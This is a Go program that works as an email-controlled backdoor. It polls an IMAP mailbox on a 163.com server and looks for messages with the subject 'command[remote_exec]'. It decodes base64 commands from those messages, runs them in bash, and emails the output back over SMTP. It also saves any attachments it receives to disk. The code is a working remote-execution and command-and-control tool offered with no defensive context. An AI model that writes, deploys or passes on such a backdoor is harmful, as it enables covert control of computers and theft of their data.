package main

import (
	b64 "encoding/base64"
	"fmt"
	"github.com/emersion/go-message/mail"
	"github.com/emersion/go-sasl"
	"github.com/emersion/go-smtp"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/emersion/go-imap"
	id "github.com/emersion/go-imap-id"
	"github.com/emersion/go-imap/client"
)

func send(to []string, command string) {
	auth := sasl.NewPlainClient("", "asd@163@163.com", "asss")

	msg := strings.NewReader("To: " + to[0] + "  \r\n" +
		"Subject: Command Result \r\n" +
		"\r\n" +
		"Command :" + command + "\r\n" +
		"Result :\r\n " + execCmd(command) + "\r\n")

	smtp.SendMail("smtp.163.com:25", auth, "asd@163@163.com", to, msg)
}

func execCmd(cmds string) string {
	result := ""
	cmds = strings.TrimSpace(cmds)
	cmds2, _ := b64.StdEncoding.DecodeString(cmds)
	cmd := exec.Command("/bin/bash", "-c", string(cmds2))
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Println("StdoutPipe: " + err.Error())
		return ""
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		fmt.Println("StderrPipe: ", err.Error())
		return ""
	}

	if err := cmd.Start(); err != nil {
		fmt.Println("Start: ", err.Error())
		return ""
	}

	bytesErr, err := ioutil.ReadAll(stderr)
	if err != nil {
		fmt.Println("ReadAll stderr: ", err.Error())
		return ""
	}
	result = result + string(bytesErr) + "\n"

	if len(bytesErr) != 0 {
		fmt.Printf("stderr is not nil: %s", bytesErr)
		return ""
	}

	bytes, err := ioutil.ReadAll(stdout)
	if err != nil {
		fmt.Println("ReadAll stdout: ", err.Error())
		return ""
	}
	result = result + string(bytes) + "\n"

	if err := cmd.Wait(); err != nil {
		fmt.Println("Wait: ", err.Error())
		return ""
	}

	return result
}

func main() {
	log.Println("Connecting to server...")

	// Connect to server
	c, err := client.Dial("imap.163.com:143")
	if err != nil {
		log.Fatal(err)
	}
	log.Println("Connected")
	idClient := id.NewClient(c)
	idClient.ID(
		id.ID{
			id.FieldName:    "IMAPClient",
			id.FieldVersion: "3.1.0",
		},
	)
	// Don't forget to logout
	defer c.Logout()

	// Login
	if err := c.Login("asd@163.com", "123"); err != nil {
		log.Fatal(err)
	}
	log.Println("Logged in")

	// List mailboxes
	mailboxes := make(chan *imap.MailboxInfo, 10)
	done := make(chan error, 1)
	go func() {
		done <- c.List("", "*", mailboxes)
	}()
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	for {
		select {
		case t := <-ticker.C:
			// Select INBOX
			_, err := c.Select("INBOX", false)
			if err != nil {
				log.Fatal(err)
			}
			//log.Println("Flags for INBOX:", mbox.Flags)

			// 选择收取邮件的时间段
			criteria := imap.NewSearchCriteria()
			criteria.WithoutFlags = []string{"\\Seen"}
			// 收取15秒内的邮件
			criteria.Since = time.Now().Add(15 * time.Second)
			// 按条件查询邮件
			ids, err := c.Search(criteria)
			if err != nil {
				fmt.Println(err)
			}
			if len(ids) == 0 {
				continue
			}
			seqSet := new(imap.SeqSet)
			seqSet.AddNum(ids...)
			var section imap.BodySectionName
			items := []imap.FetchItem{section.FetchItem()}
			messages := make(chan *imap.Message, 100)
			go func() {
				if err := c.Fetch(seqSet, items, messages); err != nil {
					log.Fatal(err)
				}
			}()
			for msg := range messages {
				resp := msg.GetBody(&section)
				if resp == nil {
					log.Fatal("Server didn't returned message body")
				}
				// Create a new mail reader
				mr, err := mail.CreateReader(resp)
				if err != nil {
					log.Fatal(err)
				}
				// Print some info about the message
				header := mr.Header
				from, err := header.AddressList("From")
				//date, err := header.Date()
				//to, err := header.AddressList("To");
				subject, err := header.Subject()
				if subject != "command[remote_exec]" {
					continue
				}
				// Process each message's part\
				in_once := 0
				for {
					p, err := mr.NextPart()
					if err == io.EOF {
						break
					} else if err != nil {
						log.Fatal(err)
					}

					switch h := p.Header.(type) {
					case *mail.InlineHeader:
						in_once++
						// This is the message's text (can be plain-text or HTML)
						b, _ := ioutil.ReadAll(p.Body)
						if in_once == 1 {
							lines := strings.Split(string(b), "\n")
							send([]string{from[0].Address}, lines[0])
						}

					case *mail.AttachmentHeader:
						in_once = 2
						// This is an attachment
						// 下载附件
						filename, err := h.Filename()
						if err != nil {
							log.Fatal(err)
						}
						if filename != "" {
							log.Println("Got attachment: ", filename)
							b, _ := ioutil.ReadAll(p.Body)
							file, _ := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, os.ModePerm)
							defer file.Close()
							n, err := file.Write(b)
							if err != nil {
								fmt.Println("写入文件异常", err.Error())
							} else {
								fmt.Println("写入Ok：", n)
							}
						}

					}
					// 标记已读
					seqSet.Clear()
					seqSet.AddNum(msg.Uid)
					item := imap.FormatFlagsOp(imap.AddFlags, true)
					flags := []interface{}{imap.SeenFlag}
					erro := c.UidStore(seqSet, item, flags, nil)
					if erro != nil {
						panic(erro)
					}
				}
			}
			fmt.Println("Current time: ", t)
		}
	}
}
